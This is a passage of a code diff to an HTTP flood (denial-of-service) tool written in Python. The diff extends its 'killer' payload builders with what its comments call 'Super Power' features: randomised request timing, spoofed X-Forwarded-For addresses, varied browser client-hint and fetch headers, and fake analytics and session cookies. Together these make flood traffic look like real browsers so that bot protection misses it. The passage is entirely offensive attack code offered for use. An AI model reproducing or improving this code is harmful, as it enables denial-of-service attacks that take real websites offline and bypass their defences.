                 for _ in range(batch):
                     payload = self._killer_payload_v3(fp)
                     if not Tools.send(s, payload):
                         break
+                    # ── Super Power: Variable inter-request timing ──────
                     if rc([True, False, False]):
+                        sleep(uniform(0.0005, 0.003))
+                    elif rc([True, False]):
+                        sleep(uniform(0.0001, 0.001))
+                    else:
                         sleep(uniform(0.0005, 0.005))
 
             return_conn(s)
@@ -1326,22 +1463,33 @@ class HttpFlood(Thread):
             Tools.safe_close(s)
 
     def _killer_build_request(self, method: str, path: str, fp: dict) -> bytes:
-        from random import randint, choice as rc
+        from random import randint, choice as rc, uniform
 
         headers = {}
         headers["host"] = self._target.authority
-        headers["user-agent"] = rc(self._useragents)
+        headers["user-agent"] = fp.get("ua_prefix", rc(self._useragents))
 
         if fp.get("sec_ch_ua"):
             headers["sec-ch-ua"] = fp["sec_ch_ua"]
             headers["sec-ch-ua-mobile"] = "?0"
             headers["sec-ch-ua-platform"] = fp["platform"]
+        elif rc([True, False, False, False, False]):
+            headers["sec-ch-ua"] = rc((
+                '"Chromium";v="135", "Google Chrome";v="135", "Not?A_Brand";v="99"',
+                '"Not?A_Brand";v="8", "Chromium";v="135", "Google Chrome";v="135"',
+                '"Google Chrome";v="135", "Chromium";v="135", "Not?A_Brand";v="24"',
+            ))
+            headers["sec-ch-ua-mobile"] = "?0"
+            headers["sec-ch-ua-platform"] = rc(('"Windows"', '"macOS"', '"Linux"'))
 
         headers["accept"] = fp["accept"]
         headers["accept-language"] = rc(fp["languages"])
         headers["accept-encoding"] = rc((
-            "gzip, deflate, br", "gzip, deflate",
-            "gzip, deflate, br, zstd"))
+            "gzip, deflate, br, zstd",
+            "gzip, deflate, br",
+            "gzip, deflate",
+            "gzip, deflate, br, zstd, compression",
+        ))
         headers["x-forwarded-for"] = ProxyTools.Random.rand_ipv4()
 
         if method == "POST":
@@ -1356,16 +1504,29 @@ class HttpFlood(Thread):
         if rc([True, False]):
             headers["dnt"] = "1"
         if rc([True, True, False]):
-            headers["cache-control"] = rc(("no-cache", "no-store, must-revalidate"))
+            headers["cache-control"] = rc((
+                "no-cache",
+                "no-store, must-revalidate",
+                "max-age=0",
+            ))
 
         cookie = self._killer_rand_cookie()
         if cookie:
             headers["cookie"] = cookie
 
         if rc([True, False]):
-            headers["sec-fetch-dest"] = rc(("document", "empty", "script"))
-            headers["sec-fetch-mode"] = rc(("navigate", "cors", "same-origin"))
-            headers["sec-fetch-site"] = rc(("none", "same-origin", "cross-site"))
+            headers["sec-fetch-dest"] = rc((
+                "document", "empty", "script",
+                "style", "image", "font", "manifest",
+            ))
+            headers["sec-fetch-mode"] = rc((
+                "navigate", "cors", "same-origin",
+                "no-cors",
+            ))
+            headers["sec-fetch-site"] = rc((
+                "none", "same-origin", "cross-site",
+                "same-site",
+            ))
             headers["sec-fetch-user"] = "?1"
 
         if rc([True, False]):
@@ -1380,6 +1541,48 @@ class HttpFlood(Thread):
         if rc([True, False, False, False]):
             ref = rc(self._referers)
             headers["referer"] = "%s%s" % (ref, parse.quote(self._target.human_repr()))
+
+        # ── Super Power: Network Information API headers ──────────────
+        if fp.get("device_memory") and rc([True, False, False, False, False]):
+            headers["device-memory"] = rc(fp["device_memory"])
+        if fp.get("viewport") and rc([True, False, False, False, False, False]):
+            vp = fp["viewport"].split("x")
+            headers["viewport-width"] = vp[0]
+            if rc([True, False]):
+                headers["width"] = rc(("1920", "2560", "1366", "1536"))
+        if fp.get("ect") and rc([True, False, False, False, False, False, False]):
+            headers["ect"] = rc(fp["ect"])
+            headers["rtt"] = rc(fp["rtt"])
+            headers["downlink"] = rc(fp["downlink"])
+
+        # ── Super Power: Hints & Priorities ───────────────────────────
+        if rc([True, False, False, False, False, False, False, False]):
+            headers["purpose"] = rc(("prefetch", "prefetch"))
+        if rc([True, False, False, False, False, False, False, False, False]):
+            headers["sec-purpose"] = "prefetch"
+        if rc([True, False, False, False, False, False, False, False, False]):
+            headers["priority"] = rc(("u=0, i", "u=1, i", "u=0", "high", "low"))
+        if rc([True, False, False, False, False, False, False, False, False, False]):
+            headers["save-data"] = "on"
+        if rc([True, False, False, False, False, False, False, False, False, False, False]):
+            headers["dpr"] = rc(("1", "2", "3"))
+        if rc([True, False, False, False, False, False, False, False, False, False, False, False]):
+            headers["max-downlink"] = rc(("10240", "5120", "2048"))
+
+        # ── Super Power: Conditional request hints ────────────────────
+        if rc([True, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            import time as _t
+            etag = '"%s"' % ProxyTools.Random.rand_str(16)
+            headers["if-none-match"] = etag
+        if rc([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            import time as _t
+            past = int(_t.time()) - randint(60, 86400)
+            from email.utils import formatdate
+            headers["if-modified-since"] = formatdate(timeval=past, usegmt=True)
+
+        # ── Super Power: X-Requested-With for AJAX simulation ────────
+        if rc([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            headers["x-requested-with"] = "XMLHttpRequest"
 
         order = fp["order"]
         ordered = []
@@ -1400,7 +1603,7 @@ class HttpFlood(Thread):
         return str.encode("".join(parts))
 
     def _killer_payload_v3(self, fp: dict) -> bytes:
-        from random import uniform, choice as rc
+        from random import uniform, choice as rc, randint
 
         method = rc(("GET", "GET", "GET", "POST", "HEAD", "PUT"))
         rand_path = self._killer_rand_path()
@@ -1410,33 +1613,60 @@ class HttpFlood(Thread):
         parts = [
             "%s %s HTTP/1.1\r\n" % (method, rand_path),
             "Host: %s\r\n" % self._target.authority,
-            "User-Agent: %s\r\n" % rc(self._useragents),
+            "User-Agent: %s\r\n" % fp.get("ua_prefix", rc(self._useragents)),
             "Accept: %s\r\n" % rc(fp["accept"]),
             "Accept-Language: %s\r\n" % rc(fp["languages"]),
             "Accept-Encoding: %s\r\n" % rc((
-                "gzip, deflate, br", "gzip, deflate",
-                "gzip, deflate, br, zstd")),
+                "gzip, deflate, br, zstd",
+                "gzip, deflate, br",
+                "gzip, deflate")),
             "X-Forwarded-For: %s\r\n" % spoof,
         ]
+
+        if fp.get("sec_ch_ua"):
+            parts.append('Sec-CH-UA: %s\r\n' % fp["sec_ch_ua"])
+            parts.append('Sec-CH-UA-Mobile: ?0\r\n')
+            parts.append('Sec-CH-UA-Platform: %s\r\n' % fp["platform"])
 
         if cookie:
             parts.append("Cookie: %s\r\n" % cookie)
         if rc([True, False]):
             parts.append("DNT: 1\r\n")
         if rc([True, False]):
-            parts.append("Cache-Control: %s\r\n" % rc(("no-cache", "no-store")))
+            parts.append("Cache-Control: %s\r\n" % rc((
+                "no-cache", "no-store", "max-age=0",
+                "no-store, must-revalidate")))
         if rc([True, False]):
             parts.append("Connection: keep-alive\r\n")
         if rc([True, False]):
-            parts.append("Sec-Fetch-Dest: document\r\n")
-            parts.append("Sec-Fetch-Mode: navigate\r\n")
-            parts.append("Sec-Fetch-Site: none\r\n")
+            parts.append("Sec-Fetch-Dest: %s\r\n" % rc((
+                "document", "empty", "script",
+                "style", "image", "font")))
+            parts.append("Sec-Fetch-Mode: %s\r\n" % rc((
+                "navigate", "cors", "same-origin")))
+            parts.append("Sec-Fetch-Site: %s\r\n" % rc((
+                "none", "same-origin", "cross-site")))
             parts.append("Sec-Fetch-User: ?1\r\n")
         if rc([True, False]):
             parts.append("Upgrade-Insecure-Requests: 1\r\n")
         if rc([True, False]):
+            parts.append("Sec-GPC: 1\r\n")
+        if rc([True, False, False, False]):
             ref = rc(self._referers)
             parts.append("Referer: %s%s\r\n" % (ref, parse.quote(self._target.human_repr())))
+
+        # ── Super Power: Network Info ─────────────────────────────────
+        if fp.get("device_memory") and rc([True, False, False, False, False]):
+            parts.append("Device-Memory: %s\r\n" % rc(fp["device_memory"]))
+        if fp.get("viewport") and rc([True, False, False, False, False, False]):
+            parts.append("Viewport-Width: %s\r\n" % fp["viewport"].split("x")[0])
+        if fp.get("ect") and rc([True, False, False, False, False, False, False]):
+            parts.append("ECT: %s\r\n" % rc(fp["ect"]))
+            parts.append("RTT: %s\r\n" % rc(fp["rtt"]))
+            parts.append("Downlink: %s\r\n" % rc(fp["downlink"]))
+
+        if rc([True, False, False, False, False, False, False, False, False]):
+            parts.append("Priority: %s\r\n" % rc(("u=0, i", "u=1, i", "u=0")))
 
         parts.append("\r\n")
 
@@ -1489,6 +1719,35 @@ class HttpFlood(Thread):
         if randchoice([True, False, False, False, False, False, False, False]):
             parts.append("intercom-session-%s=%s" % (
                 ProxyTools.Random.rand_str(8), ProxyTools.Random.rand_str(180)))
+        # ── Super Power: Additional realistic cookies ──────────────────
+        if randchoice([True, False, False, False, False, False, False, False, False, False]):
+            parts.append("_gat_gtag_UA_%d_%d=1" % (randint(1000000, 9999999),
+                                                     randint(1, 99)))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("__hstc=%d.%d.%d.%d.%d.%d" % (
+                randint(100000000, 999999999),
+                randint(100000000, 999999999),
+                randint(1000000000, 1999999999),
+                randint(1000000000, 1999999999),
+                randint(1000000000, 1999999999),
+                randint(1000000000, 1999999999)))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("hubspotutk=%s" % ProxyTools.Random.rand_str(32))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("_clck=%d|%d|1" % (randint(1000000000, 1999999999),
+                                             randint(1, 99)))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("ab_%s=%s" % (
+                ProxyTools.Random.rand_str(randint(6, 12)),
+                ProxyTools.Random.rand_str(randint(16, 32))))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("JSESSIONID=%s" % ProxyTools.Random.rand_str(randint(32, 48)))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("PHPSESSID=%s" % ProxyTools.Random.rand_str(26))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("_uetsid=%s" % ProxyTools.Random.rand_str(36))
+        if randchoice([True, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False, False]):
+            parts.append("_uetvid=%s" % ProxyTools.Random.rand_str(36))
         return "; ".join(parts) if parts else ""
 
     def GET(self) -> None:
